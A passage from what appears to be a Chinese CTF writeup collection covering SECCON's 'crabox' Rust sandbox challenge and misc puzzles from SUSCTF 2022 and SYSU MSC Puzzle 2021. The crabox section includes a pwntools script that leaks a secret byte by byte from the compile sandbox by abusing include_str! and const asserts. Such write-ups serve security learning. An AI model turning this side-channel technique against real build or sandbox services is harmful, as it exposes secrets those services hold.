*/\n}\n\"\"\".strip()\n\nprint(\"\"\"\n\ud83e\udd80 Compile-Time Sandbox Escape \ud83e\udd80\n\nInput your program (the last line must start with __EOF__):\n\"\"\".strip(), flush=True)\n\nprogram = \"\"\nwhile True:\n    line = sys.stdin.readline()\n    if line.startswith(\"__EOF__\"):\n        break\n    program += line\nif len(program) &gt; 512:\n    print(\"Your program is too long. Bye\ud83d\udc4b\".strip())\n    exit(1)\n\nsource = TEMPLATE.replace(\"{{FLAG}}\", FLAG).replace(\"{{YOUR_PROGRAM}}\", program)\n\nwith tempfile.NamedTemporaryFile(suffix=\".rs\") as file:\n    file.write(source.encode())\n    file.flush()\n\n    try:\n        proc = subprocess.run(\n            [\"rustc\", file.name],\n            cwd=\"/tmp\",\n            stdout=subprocess.DEVNULL,\n            stderr=subprocess.DEVNULL,\n            timeout=2,\n        )\n        print(\":)\" if proc.returncode == 0 else \":(\")\n    except subprocess.TimeoutExpired:\n        print(\"timeout\")\n</code></pre> <p>\u5728 Sandbox \u5206\u7c7b\u91cc\u7684\u4e00\u9053\u9898\uff0c\u6bd4\u8f83 misc\uff0c\u8003\u5bdf\u7684\u662f Rust \u7f16\u8bd1\u65f6\u5b8f\u7684\u4f7f\u7528\u3002</p> <p>\u9898\u76ee\u5927\u610f\u5c31\u662f\u5728\u63d0\u4f9b\u7684\u6a21\u677f\u4e2d\u63d2\u5165 Rust \u4ee3\u7801\uff0c\u5e76\u4e14\u91cc\u9762\u6709\u6ce8\u91ca\u7684 flag\uff0cserver \u53ea\u4f1a\u7f16\u8bd1\u8fd9\u4efd\u4ee3\u7801\u5e76\u544a\u8bc9\u4f60\u662f\u5426\u7f16\u8bd1\u6210\u529f\uff08\u65e0\u4efb\u4f55\u989d\u5916\u4fe1\u606f\uff09\u3002</p> <p>\u6240\u4ee5\u76ee\u6807\u4e5f\u5f88\u660e\u786e\uff0c\u5c31\u662f\u8981\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u6cc4\u6f0f\u51fa flag \u5185\u5bb9\u3002\u4ee5\u53ca\u53ea\u4f1a\u7f16\u8bd1\u4e0d\u4f1a\u8fd0\u884c\uff0c\u80fd\u5728\u7f16\u8bd1\u65f6\u8fdb\u884c\u7684\u64cd\u4f5c\u4e5f\u5c31\u662f\u5b8f\u4e86\u3002\u800c\u4e14 Rust \u4e2d\u8fc7\u7a0b\u5b8f\u53ea\u80fd\u5728\u4e00\u4e2a\u72ec\u7acb\u7684 lib crate \u4e2d\u7f16\u5199\uff0c\u4e0d\u80fd\u5728\u540c\u4e00\u6587\u4ef6\u4e2d\u7f16\u5199\u5e76\u4f7f\u7528\u8fc7\u7a0b\u5b8f\uff0c\u6240\u4ee5\u80af\u5b9a\u8981\u7528\u58f0\u660e\u5f0f\u5b8f\u3002</p> <p>\u6700\u521d\u7684\u60f3\u6cd5\u662f\u5229\u7528\u5b8f\u8c03\u7528\u62ec\u53f7\u53ef\u4ee5\u662f\u5927\u62ec\u53f7\u7684\u7279\u6027\u6765\u5c06\u5e26\u6709 flag \u7684\u6ce8\u91ca\u4f20\u5165\u5b8f\u4e2d\u8fdb\u884c\u5339\u914d\u5904\u7406\u3002\u4f46\u662f\u5b9e\u9645\u64cd\u4f5c\u53d1\u73b0\u5728\u8fd9\u4e2a\u65f6\u5019\u6ce8\u91ca\u5c31\u5df2\u7ecf\u88ab\u66ff\u6362\u6389\u4e86\uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u7684\u53c2\u6570\u662f\u7a7a\u7684\u800c\u4e0d\u662f\u4e00\u4e2a\u6ce8\u91ca\u3002</p> <p>\u6240\u4ee5\u5269\u4e0b\u7684\u65b9\u6cd5\u5c31\u662f\u76f4\u63a5\u8bfb\u53d6\u5f53\u524d\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>file!()</code> \u5b8f\u83b7\u53d6\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u4f7f\u7528 <code>include_str!()</code> \u5728\u7f16\u8bd1\u65f6\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002\u63a5\u4e0b\u6765\u8981\u5b9e\u73b0\u7684\u5c31\u662f\u7f16\u8bd1\u65f6\u7684 assert\uff0c\u53ef\u4ee5\u67e5\u5230\u4e00\u79cd\u5199\u6cd5\u662f\u53ef\u4ee5\u7528\u7684\uff1a</p> <pre><code>macro_rules! compile_time_assert {\n    ($condition:expr, $message:expr) =&gt; {\n        const _: [(); 0 - !($condition) as usize] = [];\n    };\n}\ncompile_time_assert!(..., \"\");\n</code></pre> <p>\u63a5\u4e0b\u6765\u8981\u89e3\u51b3\u7684\u5c31\u662f\u8bfb\u53d6\u6587\u4ef6\u4e2d\u4efb\u610f\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u5982\u679c\u662f\u76f4\u63a5\u5207\u7247\u7684\u8bdd\u662f\u4e0d\u53ef\u80fd\u5f97\u5230 const \u7684\uff0c\u4e0d\u80fd\u5728\u7f16\u8bd1\u65f6\u8fd9\u4e48\u641e\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u6307\u5411\u6587\u4ef6\u5185\u5bb9\u7684\u88f8\u6307\u9488\u6765\u64cd\u4f5c\uff0c\u5373\u6574\u4e2a\u7a0b\u5e8f\u5982\u4e0b\uff1a</p> <pre><code>fn main() {\n    const PTR: *const u8 = unsafe{ include_str!(file!()).as_ptr().offset(...) };\n    macro_rules! compile_time_assert {\n        ($condition:expr, $message:expr) =&gt; {\n            const _: [(); 0 - !($condition) as usize] = [];\n        };\n    }\n    compile_time_assert!(unsafe{ *(PTR) } == '?' as u8, \"\");\n\n    /* Steal me: SECCON{dummy} */\n}\n</code></pre> <p>\u8fd9\u6837\u53ea\u6709\u5bf9\u5e94 offset \u662f\u7ed9\u5b9a\u7684\u5b57\u7b26\u624d\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\uff0c\u5426\u5219\u4e0d\u884c\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u901a\u8fc7 flag \u4e2d\u7684\u5927\u5199\u5b57\u6bcd\u6765\u5f97\u5230 flag \u5185\u5bb9\u5bf9\u5e94\u7684 offset\uff0c\u7136\u540e\u9010\u4f4d\u679a\u4e3e\u53ef\u884c\u5b57\u7b26\u8fdb\u884c\u7206\u7834\u5c31\u53ef\u4ee5\u4e86\u3002</p> exp <pre><code>from pwn import *\n\n# context(log_level=\"debug\")\n\ntemp = \"\"\"\nconst PTR: *const u8 = unsafe{include_str!(file!()).as_ptr().offset(__OFFSET__)};\n    const COS: &amp;str = include_str!(file!());\n    macro_rules! compile_time_assert {\n        ($condition:expr, $message:expr) =&gt; {\n            const _: [(); 0 - !($condition) as usize] = [];\n        };\n    }\n    compile_time_assert!(unsafe{*(PTR)} == __ASCII__, \"1\");\n__EOF__\n\"\"\".strip()\n\noffset = 378\ncharset = \"_abcdefghijklmnopqrstuvwxyz0123456789\"\nflag = \"SECCON{\"\n\nfor i in range(0, 17):\n    for char in charset:\n        c = str(ord(char))\n        length = len(c)\n        payload = temp.replace(\"__OFFSET__\", str(offset + i)).replace(\"__ASCII__\", c if length == 3 else c + \" \")\n        p = remote(\"crabox.seccon.games\", 1337)\n        p.sendlineafter(b\"):\\n\", payload.encode())\n        res = p.recvline()\n        if b\":)\" in res:\n            flag += char\n            print(flag)\n            break\n        p.close()\n</code></pre> <p>flag: SECCON{ctfe_i5_p0w3rful}</p>"},{"location":"writeups/susctf2022/","title":"SUSCTF 2022 Writeup","text":"<p> \u7ea6 496 \u4e2a\u5b57  83 \u884c\u4ee3\u7801  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u6b21\u7684 misc \u9898\u8d28\u91cf\u4e0d\u9ad8\uff0c\u96be\u5ea6\u5206\u5212\u4e25\u91cd\uff0cAK \u4e86\uff0c\u5199\u4e00\u4e0b</p>"},{"location":"writeups/susctf2022/#ra2","title":"ra2","text":"<p>\u7ea2\u8b66\u81ea\u5236\u5173\u5361\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6e38\u620f\u81ea\u5e26\u7684 Extras \u2192 map editor\uff0c\u5373\u53ef\u8fdb\u5165\u770b\u5230\u5730\u56fe\u4e2d\u7684 lunar flag \u548c billboard</p> <p></p> <p>\u5176\u4e2d billboard \u4e0a\u64ad\u653e\u7684\u5c31\u662f\u4e09\u5e27 flag</p> <p>\u6216\u8005\u53ef\u4ee5\u627e\u5230\u6e38\u620f\u6587\u4ef6\u5939 mods/rv/maps/ctf-01\uff0c\u4fee\u6539\u5176\u4e2d\u63a7\u5236\u6e38\u620f\u903b\u8f91\u7684 lua \u6587\u4ef6\uff0c\u5c06\u96be\u5ea6\u964d\u4f4e\uff0c\u53ef\u4ee5\u8fdb\u5165\u6e38\u620f\u627e\u5230 flag</p> <p>flag: SUSCTF{RED_ALERT_WINNER!!!}</p>"},{"location":"writeups/susctf2022/#tanner","title":"Tanner","text":"<p>Tanner \u56fe\uff0cLDPC \u7801\uff0c\u53d1\u73b0\u6587\u4ef6\u5c3e\u6709\u6240\u6c42\u5185\u5bb9\uff1a</p> <pre><code>THE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front)\n</code></pre> <p>\u5373\u6c42\u6240\u6709\u6ee1\u8db3\u8fd9\u4e2a LDPC \u6821\u9a8c\u7801\u7684\u6240\u6709\u6bd4\u7279\u5e8f\u5217\u52a0\u8d77\u6765\u4e4b\u540e\u7684\u503c\u7684 sha256</p> <p>\u4ece\u7f51\u4e0a\u968f\u4fbf\u627e\u4e86\u4e2a decoder \u6765\u7528\uff1ahttp://leohope.com/\u89e3\u95ee\u9898/2019/01/11/ldpc-with-python/</p> <p>\u968f\u610f\u4f20\u5165\u4e00\u4e2a\u6bd4\u7279\u5e8f\u5217\uff0c\u5982\u679c\u5b83\u89e3\u51fa\u6765\u7684\u5e8f\u5217\u6ca1\u6709\u53d8\u5316\uff0c\u5219\u8bf4\u660e\u5f53\u524d\u5e8f\u5217\u6ee1\u8db3\u9700\u8981</p> <p>\u4e00\u5171 10 \u4e2a\u6bd4\u7279\uff0c1024 \u79cd\u60c5\u51b5\uff0c\u679a\u4e3e\u5373\u53ef\uff1a</p> <pre><code>import hashlib\nimport numpy as np\n\ndef decode(H, y, m, n, p):\n    fr = np.zeros((m, 2 * p))\n    fs = np.zeros((m, 2 * p))\n    sum = np.zeros(m)\n    c = np.zeros((n, p+2))\n    y1 = np.zeros(n)\n\n    for i in range(m):\n        count = 0\n        for j in range(n):\n            if H[i][j] == 1:\n                fr[i, count] = y[j]\n                sum[i] = sum[i]+y[j]\n                count = count+1\n\n    for i in range(m):\n        for j in range(2*p):\n            fs[i, j] = (sum[i]-fr[i, j]) % 2\n\n    for i in range(m):\n        count = 0\n        for j in range(n):\n            if H[i][j] == 1:\n                index = int(c[j, p+1])\n                c[j, index] = fs[i, count]\n                count = count+1\n                c[j, p+1] += 1\n\n    for i in range(n):\n        c[i, p] = y[i]\n\n    for i in range(n):\n        count = 0\n        for j in range(p+1):\n            if c[i, j] == 1:\n                count += 1\n        if count &gt; (p+1)/2:\n            y1[i] = 1\n    return y1\n\nm = 5\nn = 10\np = 2\n\nH = np.zeros((5, 10))\nH = [[1, 1, 1, 1, 0, 0, 0, 0, 0, 0],\n     [1, 0, 0, 0, 1, 1, 1, 0, 0, 0],\n     [0, 1, 0, 0, 1, 0, 0, 1, 1, 0],\n     [0, 0, 1, 0, 0, 1, 0, 1, 0, 1],\n     [0, 0, 0, 1, 0, 0, 1, 0, 1, 1]]\n\nans = 0\nfor i in range(1024):\n    bi = f\"{bin(i)[2:]:&gt;010}\"\n    lst = list(map(int, bi))\n    res = decode(H, lst, m, n, p)\n    if all(lst == res):\n        ans += i\nprint(hashlib.sha256(bin(ans)[2:].encode(\"utf-8\")).hexdigest())\n# c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1\n</code></pre> <p>flag: SUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}</p>"},{"location":"writeups/susctf2022/#audio","title":"AUDIO","text":"<p>\u97f3\u9891\u9690\u5199\uff0c\u5df2\u7ecf\u7ed9\u4e86\u4fee\u6539\u540e\u7684\u6587\u4ef6\u548c\u539f\u6587\u4ef6\uff0c\u80af\u5b9a\u8981\u6bd4\u8f83\u5f02\u540c\uff0c\u76f4\u63a5\u5728 Au \u91cc\u8fdb\u884c\u64cd\u4f5c</p> <p>\u5148\u5339\u914d\u54cd\u5ea6\uff0c\u7136\u540e\u7ed9\u4e00\u6bb5\u97f3\u9891\u53cd\u76f8\uff0c\u4e4b\u540e\u4e24\u6bb5\u97f3\u9891\u8fdb\u884c\u591a\u8f68\u6df7\u97f3\uff0c\u8fd9\u6837\u76f8\u540c\u90e8\u5206\u4f1a\u62b5\u6d88\u6389</p> <p>\u53ef\u4ee5\u5f88\u6e05\u695a\u5730\u542c\u5230\u4e2d\u95f4\u6709\u4e00\u6bb5\u6ef4\u6ef4\u58f0\uff0c\u662f\u6469\u5c14\u65af\u7535\u7801\uff0c\u6284\u5199\u7ffb\u8bd1\uff1a <pre><code>... ..- ... -.-. - ..-. -- .- ... - . .-. --- ..-. .- ..- -.. .. ---\n</code></pre></p> <p><code>SUSCTFMASTEROFAUDIO</code></p> <p>flag: SUSCTF{MASTEROFAUDIO}</p>"},{"location":"writeups/susctf2022/#misound","title":"misound","text":"<p>\u97f3\u9891\uff0c\u660e\u663e\u662f SSTV\uff0c\u4f46\u662f\u4e2d\u95f4\u7a7f\u63d2\u4e86\u6742\u4e71\u7684\u97f3\u9891\uff0c\u88c1\u526a\u51fa\u6765\uff1a</p> <p></p> <pre><code>AnEWmuLTiPLyis_etimes_wiLLbEcomE_B\n</code></pre> <p>\u518d\u6839\u636e hint\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u65b0\u4e58\u6cd5\u8fd0\u7b97 _e * _ = _B \u610f\u4e49\u4e0d\u660e</p> <p>\u518d\u628a wav \u4f20\u5165 SilentEye\uff0c\u5f97\u5230\uff1a</p> <pre><code>MjA3IDM1OSAyMjAgMjI0IDM1MiAzMTUgMzU5IDM3NCAyOTAgMzEwIDI3NyA1MDcgMzkxIDUxMyA0MjMgMzkyIDUwOCAzODMgNDQwIDMyMiA0MjAgNDI3IDUwMyA0NjAgMjk1IDMxOCAyNDUgMzAyIDQwNyA0MTQgNDEwIDEzMCAzNjkgMzE3\n</code></pre> <p>base64 \u89e3\u7801\uff1a</p> <pre><code>207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317\n</code></pre> <p>\u4e09\u5341\u56db\u4e2a\u6570\u5b57\uff0c\u5bf9\u5e94\u524d\u9762\u7684\u5b57\u7b26\u4e32\u662f\u4e09\u5341\u56db\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u662f\u8fdb\u884c\u4e86\u67d0\u4e9b\u64cd\u4f5c</p> <p>\u7136\u540e\u80fd\u786e\u5b9a\u7684\u662f flag \u5f00\u5934\u7ed3\u5c3e\u662f <code>SUSCTF{</code> \u548c <code>}</code></p> <p>\u8fdb\u884c\u6f2b\u957f\u7684\u8fd0\u7b97\u548c\u731c\u6d4b\uff0c\u6700\u540e\u53d1\u73b0 AnEWmuLTiPLyis_etimes_wiLLbEcomE_B \u8fd9\u4e2a\u5b57\u7b26\u4e32\u9010\u5b57\u7b26\u4e58 flag \u540e\u503c\u7684\u53d8\u5316\u8d8b\u52bf\u548c\u524d\u9762 SilentEye \u7ed3\u679c\u7684\u8d8b\u52bf\u76f8\u540c\uff0c\u628a\u5df2\u77e5\u7684\u5199\u4e0b\u6765\uff0c\u8fdb\u884c\u7ebf\u6027\u56de\u5f52\u62df\u5408</p> <pre><code>207, 5395\n359, 9350\n220, 5727\n224, 5829\n352, 9156\n315, 8190\n359, 9348\n317, 8250\n</code></pre> <p></p> F(x) = 26.011670619246555*x+4.942379114107098 <pre><code>&gt;&gt;&gt; def f(x):\n...     return 26.011670619246555*x+4.942379114107098\n...\n&gt;&gt;&gt; for x, y in zip([207, 359, 220, 224, 352, 315, 359, 374, 290, 310, 277, 507, 391, 513, 423, 392, 508, 383, 440, 322, 420, 427, 503, 460, 295, 318, 245, 302, 407, 414, 410, 130, 369, 317], [65, 110, 69, 87, 109, 117, 76, 84, 105, 80, 76, 121, 105, 115, 95, 101, 116, 105, 109, 101, 115, 95, 119, 105, 76, 76, 98, 69, 99, 111, 109, 69, 95, 66]):\n...     print(chr(round(f(x) / y)), end=\"\")\n...\nSUSCTF{tHe_matter_iS_unremArkab1e}\n</code></pre> <p>flag: SUSCTF{tHe_matter_iS_unremArkab1e}</p>"},{"location":"writeups/sysu_msc_puzzle/","title":"SYSU MSC Puzzle 2021 Writeup","text":"<p> \u7ea6 1953 \u4e2a\u5b57  181 \u884c\u4ee3\u7801  10 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>MSC Puzzle \u662f\u7531\u4e2d\u5c71\u5927\u5b66 MSClub \u4e0e\u4e2d\u5c71\u5927\u5b66 W4terDr0p \u6218\u961f\u8054\u5408\u4e3e\u529e\u7684\u8da3\u5473\u6027\u89e3\u8c1c\u6e38\u620f</p> <p>Abstract</p> <p>\u57fa\u672c\u4e0a\u90fd\u662f GZTime \u51fa\u7684\u9898\uff0c\u7b97\u5230 CTF \u91cc\u5c31\u90fd\u662f misc \u7c7b\uff0c\u4e00\u5171 24 \u9053\u9898\uff0c\u4e0b\u9762\u662f\u7b80\u8981\u7684 writeup\uff1a</p>"},{"location":"writeups/sysu_msc_puzzle/#_1","title":"\u4f60\u597d\uff01\u52c7\u58eb","text":"<p>\u5ba3\u4f20\u6d77\u62a5\u548c\u9996\u9875\u90fd\u6709\uff0cflag\uff1a<code>msc{He1lo_Wor1d}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_2","title":"\u8001\u53e4\u8463","text":"<p><code>-.-. --- -.. . --- ..-. - .... . .---- ----. - .... -.-. . -. - ..- .-. -.--</code></p> <p>\u6469\u5c14\u65af\u7535\u7801\uff0c\u6839\u636e\u9996\u9875\u7684\u8bf4\u660e\u5728\u5355\u8bcd\u95f4\u52a0\u4e0a\u4e0b\u5212\u7ebf\u5f97\u5230 flag\uff1a<code>msc{CODE_OF_THE_19TH_CENTURY}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_3","title":"\u8eb2\u5728\u5899\u540e","text":"<p>\u6253\u5f00 DevTools \u770b Console\uff0cflag\uff1a<code>msc{Wow_Y0u_f1nd_me}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_4","title":"\u9690\u8eab\u836f\u6c34","text":"<p>\u6253\u5f00 DevTools \u770b\u4ee3\u7801\uff0c\u6709\u4e00\u4e2a display: none \u7684 flag\uff1a<code>msc{Inv1sibility_P0tiOn}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_5","title":"\u5b8c\u5f62\u586b\u7a7a","text":"<p>We, the rustling leaves,  have a voice that answers the storms, but who are you so silent?  I am _____.</p> <p>\u641c\u7d22\u8fd9\u6bb5\u8bd7\u6b4c\u5f97\u5230\u7a7a\u7f3a\u5185\u5bb9\uff0c\u683c\u5f0f\u5316\u4e00\u4e0b\u5f97\u5230 flag\uff1a<code>msc{a_mere_flower}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_6","title":"\u53bb\u95ee\u5bfc\u822a","text":"<p>\u53bb\u627e\u90a3\u4e2a\u5730\u65b9\u5427\uff01\ud83d\udc7b.\ud83d\udc7e.sysums.club</p> <p>\u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a display: none \u7684 TXT \u5b57\u6837</p> <p>\u94fe\u63a5\u76f4\u63a5\u8f6c\u5230\u7684\u5730\u5740\u662f <code>http://xn--9q8h.xn--dr8h.sysums.club/</code></p> <p>\u6240\u4ee5\u7528 dig \u547d\u4ee4\u67e5\u8be2\u4e00\u4e0b\u8fd9\u4e2a\u57df\u540d\u7684 TXT \u8bb0\u5f55\u5c31\u53ef\u4ee5\u4e86 <pre><code>dig xn--9q8h.xn--dr8h.sysums.club txt\n</code></pre> flag\uff1a<code>msc{Domain_w1th_IDNs}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_7","title":"\u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848","text":"<p>The answer to the ultimate question of life, the universe, and everything equals to A^3 + B^3 + C^3 \u52c7\u58eb\uff0c\u8fd9\u9053\u9898\u7684\u7b54\u6848\u662f msc{A+B+C}</p> <p>\u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848\u5373\u6307 42\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230 </p> \\[ -80538738812075974^3 + 80435758145817515^3+ 12602123297335631^3 = 42 \\] <p>\u6240\u4ee5 flag\uff1a<code>msc{12499142631077172}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_8","title":"\u6211\u7684\u5496\u5561","text":"<p>\u6211\u4eec\u7684\u9152\u9986\u91c7\u7528\u6700\u65b0\u7684 HTCPCP/1.0 \u534f\u8bae\u4e3a\u60a8\u63d0\u4f9b\u670d\u52a1\uff01 \u201c\u563f\uff0c\u9152\u4fdd\uff01\u6211\u7684\u5496\u5561\u5462\uff1f\u201d \u201c\u5728\u505a\u4e86\uff01\u201d \u8be5\u6b7b\uff0c\u6211\u5fd8\u4e86\u8ba9\u4ed6\u5c11\u52a0\u70b9\u725b\u5976\uff0c\u6211\u5f97\u7acb\u523b\u8ba9\u4ed6\u505c\u4e0b\uff01</p> <p>\u641c\u7d22 HTCPCP/1.0 \uff08\u8d85\u6587\u672c\u5496\u5561\u58f6\uff09\u534f\u8bae\uff0c\u505c\u6b62\u52a0\u5165\u725b\u5976\u7684\u8bf7\u6c42\u662f WHEN\uff0c\u6240\u4ee5 flag\uff1a<code>msc{WHEN}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_9","title":"\u8bbe\u8ba1\u5e08","text":"<p>\u300c\u6211\u60f3\u8981\u8fd9\u4e2a\u5b57\u5c0f\u4e00\u70b9\u7684\u540c\u65f6\u5927\u4e00\u70b9\u300d</p> <p>ww91igfYzsb0AguGyMvZDcbKzxnPz25LCIekBxnJE1qWxZrUB3rOzxjFqMfZzty0Fq==</p> <p>\u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5c0f\u5199\u8f6c\u5927\u5199\uff0c\u7136\u540e base64 \u89e3\u7801\uff0c\u5f97\u5230 flag\uff1a<code>msc{T0_4nother_Base64}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_10","title":"\u76d1\u542c\u7535\u8bdd","text":"<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/phone.mp3</p> <p>\u662f\u4e00\u4e32\u7535\u8bdd\u7684\u62e8\u53f7\u97f3\uff0c\u653e\u5230 Au \u91cc\u9762\u770b\u9891\u8c31\uff0c\u628a\u5bf9\u5e94\u6309\u952e\u6284\u4e0b\u6765\u5c31\u884c\u4e86\uff0c\u5177\u4f53\u662f\u4ec0\u4e48\u8bb0\u4e0d\u5f97\u4e86</p>"},{"location":"writeups/sysu_msc_puzzle/#_11","title":"\u4e00\u5f20\u56fe\u7247","text":"<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.png</p> <p>stegsolve \u6253\u5f00\uff0c\u5728 red 0 \u53ef\u4ee5\u6e05\u6670\u770b\u5230 flag\uff1a<code>msc{Text_Hidd3n_Und6r_The_1mage}</code> </p>"},{"location":"writeups/sysu_msc_puzzle/#_12","title":"\u6570\u5b57\u5e8f\u5217","text":"<p>..., 22, 30, 42, 56, ? , 101, 135, 176, 231, 297, ... ..., 72, 81, 90, 100, 110, ?, 132, 144, 156, 169, ... ..., 43, 47, 55, 67, 79, ?, 123, 155, 171, 175, ... ..., 891, 9805, 25, 527, 23, ?, 17, 37, 131, 43, ... ..., 58, 51, 89, 28, 97, ?, 30, 103, 107, 62, ... ..., 20, 26, 36, 50, 60, ?, 135, 138, 248, 315, ... ..., 2, 1, 9, 35, 77, ?, 91, 49, 15, 2, ... ..., 49, 62, 70, 77, 91, ?, 103, 107, 115, 122, ... ..., 8, 26, 60, ?, 196, 308, 456, 645, 880, 1166, ...</p> <p>\u76f4\u63a5\u5206\u522b\u7c98\u8d34\u5230 OEIS \u4e2d\uff0c\u5f97\u5230\u9700\u8981\u586b\u7684\u6570\u5b57\uff1a</p> <p><code>77 121 95 83 101 114 105 101 115</code></p> <p>\u770b\u6570\u5b57\u8303\u56f4\u633a\u89c4\u6574\uff0cASCII \u8f6c\u6362\u4e00\u4e0b\u5f97\u5230 flag\uff1a<code>msc{My_Series}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_13","title":"\u672a\u77e5\u4fe1\u53f7","text":"<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/signal.mp3 \u6211\u89c9\u5f97\uff0c\u8fd9\u91cc\u9762\u6709\u8e4a\u8df7\uff01\u4f60\u77e5\u9053\u4e8c\u5341\u4e16\u7eaa\u4e94\u516d\u5341\u5e74\u4ee3\u7684\u7535\u89c6\u662f\u4f7f\u7528\u6444\u50cf\u7ba1\u548c\u7535\u5b50\u76d1\u89c6\u5668\u5236\u6210\u7684\u5417\uff1f</p> <p>\u6240\u4ee5\u5e94\u8be5\u662f SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\u4f20\u8f93\u56fe\u7247\uff0c\u7528\u624b\u673a\u8f6f\u4ef6 Robot36 \u5c31\u53ef\u4ee5\u8f6c\u6362\uff0c\u5f97\u5230\uff1a </p> <p>\u626b\u63cf\u5f97\u5230 flag\uff1a<code>msc{SSTV_transfer_image}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_14","title":"\u53c8\u4e00\u5f20\u56fe\u7247","text":"<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc2.png</p> <p>\u8fd8\u662f\u6254\u5230 stegsolve \u91cc\uff0c\u5728 red0 green0 blue0 \u5206\u522b\u80fd\u770b\u5230\u6587\u5b57\uff0c\u5408\u8d77\u6765\u662f <code>\u5bc6\u7801\u662f p455w0rd</code> </p> <p>binwalk \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a png \u91cc\u504f\u79fb <code>0xC23A</code> \u540e\u9762\u85cf\u4e86\u4e00\u4e2a zip\uff0c\u63d0\u53d6\u51fa\u6765\u7528\u5bc6\u7801\u89e3\u538b\u5f97\u5230\u4e00\u4e2a svg \u6587\u4ef6</p> <p>\u6d4f\u89c8\u5668\u6253\u5f00\u4e4b\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u767d\u8272\u77e9\u5f62\uff0c\u5220\u6389\u5b83\u5c31\u80fd\u770b\u5230 flag\uff1a<code>msc{svg_The_vectors}</code></p> <p></p>"},{"location":"writeups/sysu_msc_puzzle/#_15","title":"\u76f2\u4eba\u6570\u5b66\u5bb6","text":"<p>\u2838\u2829\u282e\u2830\u2824\u2806\u2818\u2806\u2810\u2837\u282d\u2818\u2812\u2810\u2809\u2815\u280e\u2839\u282d\u280c\u2806\u283c\u282c\u2839\u2802\u280c\u2806\u283c\u283e\u281c\u2832\u2824\u282d\u2818\u2806\u2810\u283b\u2819\u282d\u2838\u2831</p> <p>Tip: \u5c06\u7ed3\u679c\u56db\u820d\u4e94\u5165\u4fdd\u7559 7 \u4f4d\u5c0f\u6570\uff0c\u5e76\u7528_\u66ff\u6362\u5c0f\u6570\u70b9\u540e\u63d0\u4ea4</p> <p>\u5bf9\u7167\u6559\u7a0b https://nemeth.aphtech.org/ \u5b66\u4e60\uff0c\u8f6c\u6362\u516c\u5f0f\uff1a</p> <p> </p> \\[ \\int_{-2}^2(x^3\\cos\\frac{x}{2}+\\frac{1}{2})\\sqrt{4-x^2}\\mathrm dx = \\pi \\approx 3.1415927 \\] <p>\u6240\u4ee5 flag\uff1a<code>msc{3_1415927}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_16","title":"\u6700\u5c0f\u7684\u8bed\u8a00","text":"<p>\u52c7\u58eb\uff0c\u636e\u8bf4\u8fd9\u4e2a\u4e16\u754c\u5728\u5f88\u4e45\u8fdc\u7684\u65f6\u5019\u6709\u4e00\u4f4d\u51ef\u6492\u5927\u5e1d\uff0c\u5728\u4ed6\u79bb\u4e16\u7684\u65f6\u5019\uff0c\u4e3a\u8fd9\u4e2a\u4e16\u754c\u521b\u9020\u4e86\u4e00\u79cd\u6700\u5c0f\u7684\u8bed\u8a00\uff0c\u6211\u4eec\u90fd\u4e0d\u6562\u8bfb\u51fa\u5b83\u7684\u540d\u79f0\u2026\u2026 